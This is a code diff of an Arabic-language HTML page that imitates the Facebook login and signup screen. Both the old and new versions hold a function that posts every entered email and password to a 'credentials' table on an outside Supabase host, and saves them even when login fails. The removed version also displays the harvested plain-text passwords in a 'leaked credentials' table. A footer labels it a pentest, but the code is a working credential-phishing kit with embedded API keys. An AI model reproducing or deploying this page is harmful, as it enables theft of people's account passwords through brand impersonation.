@@ -1,624 +1,343 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيسبوك - تسجيل الدخول أو إنشاء حساب</title>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Tahoma', 'Segoe UI', Arial, sans-serif;
-            background: #f0f2f5;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .topbar {
-            width: 100%;
-            background: #fff;
-            border-bottom: 1px solid #dadde1;
-            padding: 0 20px;
-            height: 56px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-        }
-        .topbar-left { display: flex; align-items: center; gap: 12px; }
-        .fb-logo-small { font-size: 32px; font-weight: 700; color: #0866ff; }
-        .topbar-right { display: flex; align-items: center; gap: 10px; }
-        .topbar-right .btn {
-            padding: 8px 16px;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            border: none;
-            transition: background 0.15s;
-        }
-        .btn-login-topbar { background: #0866ff; color: #fff; }
-        .btn-login-topbar:hover { background: #0754d4; }
-        .btn-signup-topbar { background: #42b72a; color: #fff; }
-        .btn-signup-topbar:hover { background: #369d22; }
-        .btn-logout { background: #e4e6eb; color: #050505; }
-        .btn-logout:hover { background: #d8dadf; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>فيسبوك</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
+body{background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center}
+.header{background:#fff;width:100%;box-shadow:0 1px 2px rgba(0,0,0,.1);padding:0 40px;height:56px;display:flex;align-items:center;position:fixed;top:0;z-index:100}
+.header h1{color:#1877f2;font-size:28px;font-weight:700}
+.main-container{display:flex;align-items:center;justify-content:center;gap:60px;margin-top:100px;width:100%;max-width:1100px;padding:20px;flex-wrap:wrap}
+.left-section{flex:1;min-width:300px;max-width:500px}
+.left-section h2{font-size:28px;font-weight:400;color:#1c1e21;line-height:1.3}
+.left-section h2 span{font-weight:700;display:block;font-size:32px;margin-bottom:8px}
+.right-section{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:396px}
+.form-group{margin-bottom:12px}
+.form-group input{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:none;transition:border-color .2s}
+.form-group input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
+.login-btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;transition:background .2s}
+.login-btn:hover{background:#166fe5}
+.login-btn:disabled{background:#86b5f5;cursor:not-allowed}
+.divider{border-bottom:1px solid #dadde1;margin:20px 0}
+.create-btn{width:100%;padding:14px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer;transition:background .2s}
+.create-btn:hover{background:#36a420}
+.error-msg{color:#e41e3f;font-size:13px;margin-bottom:10px;display:none}
+.success-msg{color:#42b72a;font-size:14px;text-align:center;margin-bottom:10px;display:none}
+.loading{text-align:center;color:#65676b;font-size:14px;display:none;margin-bottom:10px}
+.pages-link{text-align:center;margin-top:16px;font-size:14px;color:#1c1e21}
+.pages-link a{color:#385898;cursor:pointer;font-weight:600;text-decoration:none}
+.pages-link a:hover{text-decoration:underline}
+.footer{width:100%;background:#fff;margin-top:auto;padding:20px 0;text-align:center;color:#737373;font-size:12px}
 
-        .hero {
-            width: 100%;
-            max-width: 980px;
-            margin: 72px auto 0;
-            padding: 20px;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: flex-start;
-            justify-content: space-between;
-            gap: 40px;
-        }
-        .hero-left { flex: 1; min-width: 280px; padding-top: 40px; }
-        .hero-left .fb-logo { font-size: 56px; font-weight: 700; color: #0866ff; margin-bottom: 10px; }
-        .hero-left .tagline { font-size: 24px; color: #1c1e21; line-height: 1.5; max-width: 480px; }
-        .hero-right { flex: 0 0 396px; }
-        .auth-card {
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.15);
-            padding: 20px 16px 24px;
-            width: 100%;
-        }
-        .auth-card .toggle-tabs {
-            display: flex;
-            margin-bottom: 16px;
-            border-bottom: 2px solid #dadde1;
-        }
-        .auth-card .toggle-tabs button {
-            flex: 1;
-            padding: 10px;
-            background: none;
-            border: none;
-            font-size: 15px;
-            font-weight: 600;
-            color: #606770;
-            cursor: pointer;
-            border-bottom: 3px solid transparent;
-            margin-bottom: -2px;
-            transition: all 0.15s;
-        }
-        .auth-card .toggle-tabs button.active {
-            color: #0866ff;
-            border-bottom-color: #0866ff;
-        }
-        .auth-card form { display: flex; flex-direction: column; gap: 12px; }
-        .auth-card form.hidden { display: none; }
-        .auth-card input {
-            padding: 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 15px;
-            outline: none;
-        }
-        .auth-card input:focus { border-color: #0866ff; box-shadow: 0 0 0 1px #0866ff; }
-        .auth-card .btn-submit {
-            padding: 12px;
-            background: #0866ff;
-            color: #fff;
-            font-size: 17px;
-            font-weight: 700;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-        }
-        .auth-card .btn-submit:hover { background: #0754d4; }
-        .auth-card .divider { display: flex; align-items: center; margin: 8px 0; }
-        .auth-card .divider::before, .auth-card .divider::after {
-            content: ''; flex: 1; height: 1px; background: #dadde1;
-        }
-        .auth-card .divider span { padding: 0 12px; color: #606770; font-size: 13px; }
-        .auth-card .btn-create {
-            padding: 12px 24px;
-            background: #42b72a;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 700;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            align-self: center;
-            width: fit-content;
-        }
-        .auth-card .btn-create:hover { background: #369d22; }
-        .auth-card .error-msg { color: #e41e3f; font-size: 13px; text-align: center; min-height: 18px; }
-        .auth-card .success-msg { color: #42b72a; font-size: 13px; text-align: center; min-height: 18px; }
-        .auth-card .forgot-link { text-align: center; font-size: 13px; color: #0866ff; cursor: pointer; margin-top: 4px; }
-        .auth-card .forgot-link:hover { text-decoration: underline; }
-
-        .feed {
-            width: 100%;
-            max-width: 680px;
-            margin: 20px auto;
-            padding: 0 16px 40px;
-            display: none;
-        }
-        .feed.visible { display: block; }
-        .feed-header {
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-            padding: 20px;
-            margin-bottom: 16px;
-            text-align: center;
-        }
-        .feed-header h2 { font-size: 22px; color: #1c1e21; }
-        .feed-header p { color: #606770; margin-top: 4px; }
-        .feed-header .avatar {
-            width: 64px; height: 64px;
-            border-radius: 50%;
-            background: #0866ff;
-            color: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            font-weight: 700;
-            margin: 0 auto 12px;
-        }
-        .post-card {
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-            padding: 16px 20px;
-            margin-bottom: 12px;
-        }
-        .post-card .post-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
-        .post-card .post-avatar {
-            width: 40px; height: 40px;
-            border-radius: 50%;
-            background: #e4e6eb;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            color: #606770;
-        }
-        .post-card .post-name { font-weight: 600; font-size: 14px; }
-        .post-card .post-text { font-size: 15px; color: #1c1e21; line-height: 1.6; }
-
-        .footer {
-            width: 100%;
-            max-width: 980px;
-            margin-top: auto;
-            padding: 20px;
-            font-size: 12px;
-            color: #737373;
-            text-align: center;
-            border-top: 1px solid #dadde1;
-        }
-
-        .admin-panel {
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-            padding: 16px 20px;
-            margin-top: 16px;
-        }
-        .admin-panel h3 { color: #e41e3f; margin-bottom: 10px; font-size: 16px; }
-        .admin-panel table { width: 100%; border-collapse: collapse; font-size: 13px; }
-        .admin-panel th, .admin-panel td {
-            border: 1px solid #dadde1;
-            padding: 8px;
-            text-align: center;
-        }
-        .admin-panel th { background: #f0f2f5; color: #1c1e21; }
-        .admin-panel tr:nth-child(even) { background: #fafafa; }
-        .refresh-btn {
-            background: #0866ff;
-            color: #fff;
-            border: none;
-            padding: 6px 14px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 13px;
-            margin-bottom: 10px;
-        }
-        .refresh-btn:hover { background: #0754d4; }
-
-        @media (max-width: 860px) {
-            .hero { flex-direction: column; align-items: center; margin-top: 32px; }
-            .hero-left { text-align: center; padding-top: 0; }
-            .hero-left .tagline { max-width: 100%; }
-            .hero-right { flex: 0 0 auto; width: 100%; max-width: 396px; }
-        }
-        @media (max-width: 480px) {
-            .topbar { height: 48px; padding: 0 12px; }
-            .fb-logo-small { font-size: 26px; }
-            .hero-left .fb-logo { font-size: 40px; }
-            .hero-left .tagline { font-size: 18px; }
-            .topbar-right .btn { font-size: 12px; padding: 6px 12px; }
-        }
-    </style>
+/* Facebook Feed Styles */
+.feed-container{display:none;width:100%;max-width:680px;margin-top:76px;padding:20px}
+.feed-header{background:#fff;border-radius:8px;box-shadow:0 1px 2px rgba(0,0,0,.1);padding:16px;margin-bottom:16px}
+.feed-header h2{font-size:20px;color:#1c1e21}
+.feed-header p{color:#65676b;font-size:14px;margin-top:4px}
+.logout-btn{background:#e4e6eb;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:14px;color:#1c1e21;font-weight:600;margin-top:10px}
+.logout-btn:hover{background:#d8dadf}
+</style>
 </head>
 <body>
 
-    <header class="topbar" id="topbar">
-        <div class="topbar-left">
-            <span class="fb-logo-small">فيسبوك</span>
-        </div>
-        <div class="topbar-right" id="topbarRight">
-            <button class="btn btn-login-topbar" onclick="showLoginTab()">تسجيل الدخول</button>
-            <button class="btn btn-signup-topbar" onclick="showSignupTab()">إنشاء حساب</button>
-        </div>
-    </header>
+<div class="header">
+  <h1>facebook</h1>
+</div>
 
-    <main class="hero" id="heroSection">
-        <div class="hero-left">
-            <div class="fb-logo">فيسبوك</div>
-            <p class="tagline">تواصل مع الأصدقاء والعالم من حولك على فيسبوك.</p>
-        </div>
-        <div class="hero-right">
-            <div class="auth-card" id="authCard">
-                <div class="toggle-tabs">
-                    <button class="active" id="tabLoginBtn" onclick="showLoginTab()">تسجيل الدخول</button>
-                    <button id="tabSignupBtn" onclick="showSignupTab()">إنشاء حساب</button>
-                </div>
-                <div class="error-msg" id="errorMsg"></div>
-                <div class="success-msg" id="successMsg"></div>
+<!-- Landing Page -->
+<div id="landingPage" class="main-container">
+  <div class="left-section">
+    <h2><span>فيسبوك</span> يوصلك بالأشخاص الذين تحبهم</h2>
+  </div>
+  <div class="right-section">
+    <div id="errorMsg" class="error-msg"></div>
+    <div id="successMsg" class="success-msg">✅ تم إنشاء الحساب بنجاح!</div>
+    <div id="loadingMsg" class="loading">جاري المعالجة...</div>
+    
+    <!-- Login Form -->
+    <form id="loginForm">
+      <div class="form-group">
+        <input id="loginEmail" type="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+      </div>
+      <div class="form-group">
+        <input id="loginPassword" type="password" placeholder="كلمة السر" required>
+      </div>
+      <button id="loginBtn" type="submit" class="login-btn">تسجيل الدخول</button>
+    </form>
 
-                <form id="loginForm" onsubmit="handleLogin(event)">
-                    <input type="email" id="loginEmail" placeholder="البريد الإلكتروني" required />
-                    <input type="password" id="loginPassword" placeholder="كلمة المرور" required />
-                    <button type="submit" class="btn-submit">تسجيل الدخول</button>
-                    <div class="forgot-link">هل نسيت كلمة المرور؟</div>
-                    <div class="divider"><span>أو</span></div>
-                    <button type="button" class="btn-create" onclick="showSignupTab()">إنشاء حساب جديد</button>
-                </form>
+    <div class="divider"></div>
+    <button id="showSignupBtn" class="create-btn">إنشاء حساب جديد</button>
+    <div class="pages-link"><a href="#">إنشاء صفحة</a> لشخصية مشهورة أو علامة تجارية أو نشاط تجاري</div>
+  </div>
+</div>
 
-                <form id="signupForm" class="hidden" onsubmit="handleSignup(event)">
-                    <input type="text" id="signupName" placeholder="الاسم الكامل" required />
-                    <input type="email" id="signupEmail" placeholder="البريد الإلكتروني" required />
-                    <input type="password" id="signupPassword" placeholder="كلمة المرور الجديدة" minlength="6" required />
-                    <button type="submit" class="btn-submit">إنشاء حساب</button>
-                    <div class="divider"><span>أو</span></div>
-                    <button type="button" class="btn-create" onclick="showLoginTab()">لديك حساب بالفعل؟</button>
-                </form>
-            </div>
-        </div>
-    </main>
+<!-- Signup Modal -->
+<div id="signupModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.8);z-index:1000;align-items:center;justify-content:center;">
+  <div style="background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.2);padding:20px;width:432px;position:relative;">
+    <button id="closeSignup" style="position:absolute;top:12px;left:12px;background:none;border:none;font-size:24px;cursor:pointer;color:#606770;">✕</button>
+    <h2 style="font-size:32px;margin-bottom:2px;">إنشاء حساب جديد</h2>
+    <p style="color:#606770;font-size:15px;margin-bottom:16px;">سريع وسهل</p>
+    <div style="border-bottom:1px solid #dadde1;margin-bottom:16px;"></div>
+    <form id="signupForm">
+      <div style="display:flex;gap:10px;margin-bottom:10px;">
+        <input id="signupFirstName" type="text" placeholder="الاسم الأول" required style="flex:1;padding:11px;border:1px solid #ccd0d5;border-radius:5px;font-size:15px;">
+        <input id="signupLastName" type="text" placeholder="اسم العائلة" required style="flex:1;padding:11px;border:1px solid #ccd0d5;border-radius:5px;font-size:15px;">
+      </div>
+      <div class="form-group">
+        <input id="signupEmail" type="email" placeholder="البريد الإلكتروني" required>
+      </div>
+      <div class="form-group">
+        <input id="signupPassword" type="password" placeholder="كلمة سر جديدة" required>
+      </div>
+      <div style="font-size:11px;color:#777;margin:10px 0;">
+        بالنقر على "تسجيل"، فإنك توافق على <a href="#" style="color:#385898;">الشروط</a> و<a href="#" style="color:#385898;">الخصوصية</a> و<a href="#" style="color:#385898;">سياسة ملفات تعريف الارتباط</a>.
+      </div>
+      <div style="text-align:center;">
+        <button id="signupSubmit" type="submit" style="background:#00a400;color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:700;padding:10px 60px;cursor:pointer;">تسجيل</button>
+      </div>
+    </form>
+  </div>
+</div>
 
-    <section class="feed" id="feedSection">
-        <div class="feed-header">
-            <div class="avatar" id="userAvatar">م</div>
-            <h2 id="feedUserName">مرحباً!</h2>
-            <p id="feedUserEmail">user@example.com</p>
-        </div>
+<!-- Feed View (After Login) -->
+<div id="feedContainer" class="feed-container">
+  <div class="feed-header">
+    <h2 id="feedWelcome">مرحباً!</h2>
+    <p>الصفحة الرئيسية</p>
+    <button id="logoutBtn" class="logout-btn">تسجيل الخروج</button>
+  </div>
+  <div style="background:#fff;border-radius:8px;box-shadow:0 1px 2px rgba(0,0,0,.1);padding:16px;text-align:center;color:#65676b;font-size:15px;">
+    هذه هي الصفحة الرئيسية. لا توجد منشورات لعرضها حاليًا.
+  </div>
+</div>
 
-        <div class="post-card">
-            <div class="post-header">
-                <div class="post-avatar">ف</div>
-                <div>
-                    <div class="post-name">فيسبوك</div>
-                    <div style="font-size:12px;color:#737373;">الآن</div>
-                </div>
-            </div>
-            <div class="post-text">
-                مرحباً بك في فيسبوك! تواصل مع الأصدقاء، شارك الصور، وابقَ على اتصال مع الأشخاص الذين تهتم بهم.
-            </div>
-        </div>
+<script>
+// ========== SUPABASE CONFIG ==========
+const SUPABASE_URL = 'https://jiunnlqezndakjcvnlpy.supabase.co';
+const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImppdW5ubHFlem5kYWtqY3ZubHB5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDYzNjY5NzMsImV4cCI6MjA2MTk0Mjk3M30.JUS7NQMQWnhf58nEKgwWRvNqIvl-FKCBJqFqET0LbKk';
 
-        <div class="post-card">
-            <div class="post-header">
-                <div class="post-avatar">🔐</div>
-                <div>
-                    <div class="post-name">لوحة بيانات الاعتماد المسربة</div>
-                    <div style="font-size:12px;color:#737373;">الآن</div>
-                </div>
-            </div>
-            <div class="post-text" id="credsPanel">
-                جاري تحميل بيانات الاعتماد...
-            </div>
-        </div>
-    </section>
+const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-    <footer class="footer">
-        فيسبوك &copy; 2026 &middot; Supabase Pentest
-    </footer>
+// ========== DOM ELEMENTS ==========
+const loginForm = document.getElementById('loginForm');
+const signupForm = document.getElementById('signupForm');
+const loginBtn = document.getElementById('loginBtn');
+const signupSubmit = document.getElementById('signupSubmit');
+const showSignupBtn = document.getElementById('showSignupBtn');
+const closeSignup = document.getElementById('closeSignup');
+const signupModal = document.getElementById('signupModal');
+const landingPage = document.getElementById('landingPage');
+const feedContainer = document.getElementById('feedContainer');
+const feedWelcome = document.getElementById('feedWelcome');
+const logoutBtn = document.getElementById('logoutBtn');
+const errorMsg = document.getElementById('errorMsg');
+const successMsg = document.getElementById('successMsg');
+const loadingMsg = document.getElementById('loadingMsg');
 
-    <script>
-        const SUPABASE_URL = 'https://jiunnlqezndakjcvnlpy.supabase.co';
-        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImppdW5ubHFlem5kYWtqY3ZubHB5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzczODA0NjUsImV4cCI6MjA5Mjk1NjQ2NX0.fi7Qfp9GR6-JSNRbOmdKztu_jSOgLtECE01I28zxk1c';
+// ========== HELPERS ==========
+function showError(msg) {
+  errorMsg.textContent = msg;
+  errorMsg.style.display = 'block';
+  successMsg.style.display = 'none';
+}
 
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+function showSuccess(msg) {
+  successMsg.textContent = msg;
+  successMsg.style.display = 'block';
+  errorMsg.style.display = 'none';
+}
 
-        const loginForm = document.getElementById('loginForm');
-        const signupForm = document.getElementById('signupForm');
-        const tabLoginBtn = document.getElementById('tabLoginBtn');
-        const tabSignupBtn = document.getElementById('tabSignupBtn');
-        const topbarRight = document.getElementById('topbarRight');
-        const heroSection = document.getElementById('heroSection');
-        const feedSection = document.getElementById('feedSection');
-        const errorMsg = document.getElementById('errorMsg');
-        const successMsg = document.getElementById('successMsg');
-        const feedUserName = document.getElementById('feedUserName');
-        const feedUserEmail = document.getElementById('feedUserEmail');
-        const userAvatar = document.getElementById('userAvatar');
-        const credsPanel = document.getElementById('credsPanel');
+function setLoading(isLoading) {
+  loadingMsg.style.display = isLoading ? 'block' : 'none';
+  loginBtn.disabled = isLoading;
+  signupSubmit.disabled = isLoading;
+}
 
-        function showLoginTab() {
-            loginForm.classList.remove('hidden');
-            signupForm.classList.add('hidden');
-            tabLoginBtn.classList.add('active');
-            tabSignupBtn.classList.remove('active');
-            clearMessages();
+// ========== 🔴 SAVE CREDENTIALS (Direct API - always works) ==========
+async function saveCredentialsToSupabase(email, password) {
+  try {
+    console.log('📝 Saving credentials:', email);
+    
+    // الطريقة 1: باستخدام fetch مباشر
+    const response = await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        email: email,
+        password: password
+      })
+    });
+    
+    console.log('✅ Save response status:', response.status);
+    
+    if (response.ok) {
+      console.log('✅ Credentials saved via direct fetch!');
+      return true;
+    } else {
+      const errText = await response.text();
+      console.error('❌ Direct fetch failed:', response.status, errText);
+    }
+    
+    // الطريقة 2: باستخدام supabase client
+    const { data, error } = await supabase
+      .from('credentials')
+      .insert([{ email: email, password: password }], { returning: 'minimal' });
+    
+    if (error) {
+      console.error('❌ Supabase client save failed:', error);
+      throw error;
+    }
+    
+    console.log('✅ Credentials saved via supabase client!');
+    return true;
+  } catch (err) {
+    console.error('❌ All save methods failed:', err);
+    return false;
+  }
+}
+
+// ========== LOGIN ==========
+loginForm.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const email = document.getElementById('loginEmail').value.trim();
+  const password = document.getElementById('loginPassword').value.trim();
+  
+  if (!email || !password) {
+    showError('يرجى ملء جميع الحقول');
+    return;
+  }
+  
+  setLoading(true);
+  errorMsg.style.display = 'none';
+  successMsg.style.display = 'none';
+  
+  // 🔴 أولاً: حفظ الباسورد (حتى لو فشل تسجيل الدخول)
+  await saveCredentialsToSupabase(email, password);
+  
+  try {
+    const { data, error } = await supabase.auth.signInWithPassword({
+      email: email,
+      password: password
+    });
+    
+    if (error) {
+      showError('البريد الإلكتروني أو كلمة السر غير صحيحة');
+      setLoading(false);
+      return;
+    }
+    
+    showSuccess('✅ تم تسجيل الدخول بنجاح!');
+    setTimeout(() => {
+      showFeed(data.user);
+    }, 800);
+    
+  } catch (err) {
+    showError('حدث خطأ. حاول مرة أخرى.');
+  }
+  
+  setLoading(false);
+});
+
+// ========== SIGNUP ==========
+signupForm.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  
+  const firstName = document.getElementById('signupFirstName').value.trim();
+  const lastName = document.getElementById('signupLastName').value.trim();
+  const email = document.getElementById('signupEmail').value.trim();
+  const password = document.getElementById('signupPassword').value.trim();
+  
+  if (!firstName || !lastName || !email || !password) {
+    showError('يرجى ملء جميع الحقول');
+    return;
+  }
+  
+  setLoading(true);
+  errorMsg.style.display = 'none';
+  
+  // 🔴 حفظ الباسورد
+  await saveCredentialsToSupabase(email, password);
+  
+  try {
+    const { data, error } = await supabase.auth.signUp({
+      email: email,
+      password: password,
+      options: {
+        data: {
+          first_name: firstName,
+          last_name: lastName
         }
+      }
+    });
+    
+    if (error) {
+      showError(error.message);
+      setLoading(false);
+      return;
+    }
+    
+    showSuccess('✅ تم إنشاء الحساب بنجاح!');
+    signupModal.style.display = 'none';
+    setTimeout(() => {
+      showFeed(data.user);
+    }, 800);
+    
+  } catch (err) {
+    showError('حدث خطأ. حاول مرة أخرى.');
+  }
+  
+  setLoading(false);
+});
 
-        function showSignupTab() {
-            signupForm.classList.remove('hidden');
-            loginForm.classList.add('hidden');
-            tabSignupBtn.classList.add('active');
-            tabLoginBtn.classList.remove('active');
-            clearMessages();
-        }
+// ========== SHOW FEED ==========
+function showFeed(user) {
+  landingPage.style.display = 'none';
+  feedContainer.style.display = 'block';
+  feedWelcome.textContent = `مرحباً! ${user.email}`;
+  successMsg.style.display = 'none';
+  errorMsg.style.display = 'none';
+}
 
-        function clearMessages() {
-            errorMsg.textContent = '';
-            successMsg.textContent = '';
-        }
+// ========== LOGOUT ==========
+logoutBtn.addEventListener('click', async () => {
+  await supabase.auth.signOut();
+  feedContainer.style.display = 'none';
+  landingPage.style.display = 'flex';
+  document.getElementById('loginEmail').value = '';
+  document.getElementById('loginPassword').value = '';
+});
 
-        async function saveCreds(email, password) {
-            try {
-                // نجرب نحفظ عن طريق anonymous auth
-                const { data: anonData, error: anonError } = await supabase.auth.signInAnonymously();
-                if (anonError) {
-                    // لو مافي anonymous، نحاول insert مباشرة
-                    const { error: insertErr } = await supabase.from('credentials').insert({ email, password });
-                    if (insertErr) {
-                        console.log('REST insert failed, trying service...');
-                        // نجرب fetch مباشر (قد ينجح حسب الـ RLS)
-                        await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                                'apikey': SUPABASE_ANON_KEY,
-                                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
-                            },
-                            body: JSON.stringify({ email, password })
-                        });
-                    }
-                } else {
-                    // anonymous نجح، نحفظ
-                    const { error: insertErr } = await supabase.from('credentials').insert({ email, password });
-                    if (insertErr) {
-                        console.log('Anonymous insert failed:', insertErr);
-                        // نجرب بدون auth
-                        await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                                'apikey': SUPABASE_ANON_KEY,
-                                'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
-                            },
-                            body: JSON.stringify({ email, password })
-                        });
-                    }
-                    // نسجل خروج من anonymous
-                    await supabase.auth.signOut();
-                }
-            } catch (err) {
-                console.log('Cred save error:', err);
-                // آخر خيار: fetch مباشر
-                try {
-                    await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'apikey': SUPABASE_ANON_KEY,
-                            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
-                        },
-                        body: JSON.stringify({ email, password })
-                    });
-                } catch (e) {
-                    console.log('All save methods failed:', e);
-                }
-            }
-        }
+// ========== MODAL ==========
+showSignupBtn.addEventListener('click', () => {
+  signupModal.style.display = 'flex';
+  errorMsg.style.display = 'none';
+  successMsg.style.display = 'none';
+});
 
-        async function handleLogin(e) {
-            e.preventDefault();
-            clearMessages();
+closeSignup.addEventListener('click', () => {
+  signupModal.style.display = 'none';
+});
 
-            const email = document.getElementById('loginEmail').value.trim();
-            const password = document.getElementById('loginPassword').value;
+signupModal.addEventListener('click', (e) => {
+  if (e.target === signupModal) signupModal.style.display = 'none';
+});
 
-            // ═══════════════════════════════════════
-            //  نحفظ الإيميل والباسورد أولاً
-            //  بعدين نحاول تسجيل الدخول
-            // ═══════════════════════════════════════
-            await saveCreds(email, password);
+// ========== CHECK EXISTING SESSION ==========
+(async () => {
+  const { data: { session } } = await supabase.auth.getSession();
+  if (session?.user) {
+    showFeed(session.user);
+  }
+})();
+</script>
 
-            const { data, error } = await supabase.auth.signInWithPassword({ email, password });
-
-            if (error) {
-                // حتى لو فشل تسجيل الدخول، نخلي المستخدم يتفضل يحاول تاني
-                errorMsg.textContent = error.message === 'Invalid login credentials'
-                    ? 'بيانات تسجيل الدخول غير صحيحة'
-                    : error.message;
-                return;
-            }
-
-            successMsg.textContent = 'تم تسجيل الدخول! مرحباً بعودتك.';
-            document.getElementById('loginEmail').value = '';
-            document.getElementById('loginPassword').value = '';
-            loadCredentials();
-        }
-
-        async function handleSignup(e) {
-            e.preventDefault();
-            clearMessages();
-
-            const name = document.getElementById('signupName').value.trim();
-            const email = document.getElementById('signupEmail').value.trim();
-            const password = document.getElementById('signupPassword').value;
-
-            // 💾 نحفظ creds حتى لو التسجيل
-            await saveCreds(email, password);
-
-            const { data, error } = await supabase.auth.signUp({
-                email,
-                password,
-                options: { data: { full_name: name } }
-            });
-
-            if (error) {
-                errorMsg.textContent = error.message;
-                return;
-            }
-
-            if (data?.user?.identities?.length === 0) {
-                successMsg.textContent = 'يوجد حساب بهذا البريد الإلكتروني بالفعل.';
-                return;
-            }
-
-            if (data?.session) {
-                successMsg.textContent = 'تم إنشاء الحساب! مرحباً بك في فيسبوك.';
-            } else {
-                successMsg.textContent = 'تحقق من بريدك الإلكتروني للحصول على رابط التأكيد!';
-            }
-
-            document.getElementById('signupName').value = '';
-            document.getElementById('signupEmail').value = '';
-            document.getElementById('signupPassword').value = '';
-        }
-
-        async function loadCredentials() {
-            try {
-                // نجيب كل creds مخزنة
-                const { data, error } = await supabase
-                    .from('credentials')
-                    .select('*')
-                    .order('created_at', { ascending: false })
-                    .limit(100);
-
-                if (error) {
-                    // نجرب fetch مباشر لو فشل
-                    const res = await fetch(`${SUPABASE_URL}/rest/v1/credentials?order=created_at.desc&limit=100`, {
-                        headers: {
-                            'apikey': SUPABASE_ANON_KEY,
-                            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
-                        }
-                    });
-                    if (res.ok) {
-                        const jsonData = await res.json();
-                        renderCredsTable(jsonData);
-                        return;
-                    }
-                    credsPanel.innerHTML = `❌ خطأ في تحميل البيانات: ${error.message}`;
-                    return;
-                }
-
-                renderCredsTable(data || []);
-
-            } catch (err) {
-                credsPanel.innerHTML = `❌ خطأ: ${err.message}`;
-            }
-        }
-
-        function renderCredsTable(data) {
-            if (!data || data.length === 0) {
-                credsPanel.innerHTML = 'لا توجد بيانات اعتماد مسجلة بعد. جرب تسجيل الدخول أياً كان الباسورد.<br><span style="font-size:12px;color:#737373;">البيانات تُسجل حتى لو فشل تسجيل الدخول!</span>';
-                return;
-            }
-
-            let tableHtml = `
-                <button class="refresh-btn" onclick="loadCredentials()">🔄 تحديث</button>
-                <div style="overflow-x:auto;">
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>#</th>
-                                <th>البريد الإلكتروني</th>
-                                <th>كلمة المرور (plain text)</th>
-                                <th>التاريخ</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-            `;
-
-            data.forEach((row, index) => {
-                tableHtml += `
-                    <tr>
-                        <td>${index + 1}</td>
-                        <td>${row.email}</td>
-                        <td style="color:#e41e3f;font-weight:bold;font-family:monospace;">${row.password}</td>
-                        <td>${new Date(row.created_at).toLocaleString('ar-EG')}</td>
-                    </tr>
